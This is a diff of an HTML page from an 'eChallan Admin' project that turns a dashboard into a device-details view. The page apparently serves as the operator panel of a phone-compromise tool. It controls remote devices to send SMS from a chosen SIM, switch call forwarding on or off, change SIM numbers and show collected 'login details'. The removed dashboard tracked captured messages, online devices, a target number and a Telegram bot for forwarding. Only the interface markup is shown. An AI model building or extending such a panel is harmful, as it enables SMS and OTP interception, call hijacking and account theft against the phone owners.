@@ -3,125 +3,95 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Dashboard - eChallan Admin</title>
-  <link rel="stylesheet" href="css/style.css">
+  <title>Device Details - eChallan Admin</title>
+  <link rel="stylesheet" href="css/style.css?v=2">
 </head>
 <body>
   <div class="app-header">
     <div>
-      <h2>📱 DASHBOARD</h2>
+      <h2>📱 DEVICE DETAILS</h2>
       <div class="user-info" id="userEmail">...</div>
     </div>
-    <button class="btn-logout" onclick="logout()">Logout</button>
+    <button class="btn-logout" onclick="location.href='dashboard.html'">Back</button>
   </div>
 
   <div class="container">
-    <!-- Stats Card -->
-    <div class="stats-main-card">
-      <div class="stats-top">
-        <div class="col">
-          <div class="lbl">Send:</div>
-          <div class="val" id="statSend">0</div>
-        </div>
-        <div class="col right">
-          <div class="lbl">Received:</div>
-          <div class="val" id="statReceived">0</div>
-        </div>
-      </div>
-      <div class="stats-bottom">
-        <span class="dot-green">● Online: <span id="statOnline">0</span></span>
-        <span class="dot-red">● Offline: <span id="statOffline">0</span></span>
-        <span class="dot-yellow">● Total: <span id="statTotal">0</span></span>
-      </div>
-    </div>
-
-    <!-- Top Action Buttons -->
-    <div class="top-actions">
-      <button class="top-btn" onclick="location.href='messages.html'">ALL MESSAGES</button>
-      <button class="top-btn" onclick="openUpdateNoModal()">UPDATE NO</button>
-      <button class="top-btn" onclick="openChangePassModal()">CHANGE PASS</button>
-      <button class="top-btn" onclick="openTelegramModal()">TELEGRAM BOT</button>
-    </div>
-
-    <!-- Device List -->
-    <div class="device-list" id="deviceList">
-      <div class="loading">Loading devices...</div>
+    <div id="content">
+      <div class="loading">Loading device...</div>
     </div>
   </div>
 
-  <!-- Update Number Modal -->
-  <div class="modal-overlay" id="modalUpdateNo">
+  <div class="modal-overlay" id="modalSms">
     <div class="modal">
-      <h3>📱 UPDATE TARGET NUMBER</h3>
-      <p class="modal-sub">Current: <span id="currentTargetNo">Not Set</span></p>
+      <h3>💬 SEND SMS</h3>
+      <p class="modal-sub">Quickly send a message to any number</p>
+      <label style="font-size:12px;font-weight:700;color:#444;text-transform:uppercase;">Select SIM</label>
+      <div class="sim-selector" style="margin-top:8px;">
+        <div class="sim-option active" data-sim="1" onclick="selectSim('sms', 1)">SIM 1</div>
+        <div class="sim-option" data-sim="2" onclick="selectSim('sms', 2)">SIM 2</div>
+      </div>
       <div class="input-group">
-        <label>Enter 10-digit number</label>
-        <input type="tel" id="targetNoInput" placeholder="9876543210" maxlength="10">
+        <label>Number without +91</label>
+        <input type="tel" id="smsNumber" placeholder="Enter number" maxlength="15">
+      </div>
+      <div class="input-group">
+        <label>Message</label>
+        <textarea id="smsMessage" rows="3" placeholder="Enter message" maxlength="150"></textarea>
+        <div style="text-align:right;font-size:11px;color:#888;margin-top:4px;" id="smsCounter">0/150</div>
       </div>
       <div class="modal-actions">
-        <button class="btn-secondary" onclick="closeModal('modalUpdateNo')">CANCEL</button>
-        <button class="btn-primary" onclick="saveTargetNo()">UPDATE</button>
+        <button class="btn-secondary" onclick="closeModal('modalSms')">CANCEL</button>
+        <button class="btn-primary" onclick="sendSMS()">SEND</button>
       </div>
     </div>
   </div>
 
-  <!-- Change Password Modal -->
-  <div class="modal-overlay" id="modalChangePass">
+  <div class="modal-overlay" id="modalCallFwd">
     <div class="modal">
-      <h3>🔐 CHANGE PASSWORD</h3>
-      <div class="input-group">
-        <label>Old Password</label>
-        <input type="password" id="oldPass" placeholder="Old Password">
+      <h3>📞 CALL FORWARDING</h3>
+      <div class="sim-selector">
+        <div class="sim-option active" data-sim="1" onclick="selectSim('cf', 1)">SIM 1</div>
+        <div class="sim-option" data-sim="2" onclick="selectSim('cf', 2)">SIM 2</div>
       </div>
       <div class="input-group">
-        <label>New Password</label>
-        <input type="password" id="newPass" placeholder="New Password">
+        <label>Forward to Number</label>
+        <input type="tel" id="cfNumber" placeholder="Number" maxlength="15">
       </div>
-      <div class="input-group">
-        <label>Confirm Password</label>
-        <input type="password" id="confirmPass" placeholder="Confirm Password">
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:16px;">
+        <button class="btn-success" style="padding:14px;border-radius:12px;border:none;font-weight:800;font-size:13px;" onclick="sendCallForward('activate')">ACTIVATE</button>
+        <button class="btn-danger" style="padding:14px;border-radius:12px;border:none;font-weight:800;font-size:13px;" onclick="sendCallForward('deactivate')">DEACTIVATE</button>
       </div>
-      <div class="modal-actions">
-        <button class="btn-secondary" onclick="closeModal('modalChangePass')">CANCEL</button>
-        <button class="btn-primary" onclick="changePassword()">SAVE</button>
+      <button class="btn-warning" style="width:100%;padding:14px;border-radius:12px;border:none;font-weight:800;font-size:13px;margin-top:10px;" onclick="sendCallForward('check_status')">CHECK STATUS</button>
+      <div class="modal-actions" style="margin-top:14px;">
+        <button class="btn-secondary" onclick="closeModal('modalCallFwd')">CLOSE</button>
       </div>
     </div>
   </div>
 
-  <!-- Telegram Bot Modal -->
-  <div class="modal-overlay" id="modalTelegram">
+  <div class="modal-overlay" id="modalSim">
     <div class="modal">
-      <h3>🤖 TELEGRAM BOT</h3>
-      <p class="modal-sub" id="telegramStatus">❌ Not Configured</p>
+      <h3>📶 UPDATE SIM NUMBERS</h3>
       <div class="input-group">
-        <label>Bot Token (from @BotFather)</label>
-        <input type="text" id="tgToken" placeholder="123456789:ABCdefGHIjkl...">
+        <label>SIM 1 Number</label>
+        <input type="tel" id="sim1Input" placeholder="+91XXXXXXXXXX">
       </div>
       <div class="input-group">
-        <label>Chat ID (from @userinfobot)</label>
-        <input type="text" id="tgChatId" placeholder="123456789 or -100123456">
+        <label>SIM 2 Number</label>
+        <input type="tel" id="sim2Input" placeholder="+91XXXXXXXXXX">
       </div>
       <div class="modal-actions">
-        <button class="btn-secondary" onclick="closeModal('modalTelegram')">CANCEL</button>
-        <button class="btn-primary" onclick="saveTelegram()">SAVE</button>
-      </div>
-      <div style="font-size:11px;color:#888;margin-top:12px;line-height:1.6;">
-        <b>🤖 How to get:</b><br>
-        1. Telegram pe @BotFather → /newbot<br>
-        2. Token copy karo<br>
-        3. @userinfobot → /start → Chat ID copy karo
+        <button class="btn-secondary" onclick="closeModal('modalSim')">CANCEL</button>
+        <button class="btn-primary" onclick="updateSim()">UPDATE</button>
       </div>
     </div>
   </div>
 
-  <!-- Delete Confirmation Modal -->
-  <div class="modal-overlay" id="modalDelete">
+  <div class="modal-overlay" id="modalLoginDetails">
     <div class="modal">
-      <h3>🗑️ DELETE DEVICE</h3>
-      <p class="modal-sub" id="deleteDeviceName">Kya aap sure hain?</p>
-      <div class="modal-actions">
-        <button class="btn-secondary" onclick="closeModal('modalDelete')">CANCEL</button>
-        <button class="btn-danger" onclick="confirmDelete()">DELETE</button>
+      <h3>🔐 LOGIN DETAILS</h3>
+      <div id="loginDetailsContent">Loading...</div>
+      <div class="modal-actions" style="margin-top:14px;">
+        <button class="btn-secondary" onclick="closeModal('modalLoginDetails')">CLOSE</button>
       </div>
     </div>
   </div>
@@ -130,6 +100,6 @@
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
   <script src="js/firebase-config.js"></script>
-  <script src="js/dashboard.js"></script>
+  <script src="js/device.js"></script>
 </body>
 </html>
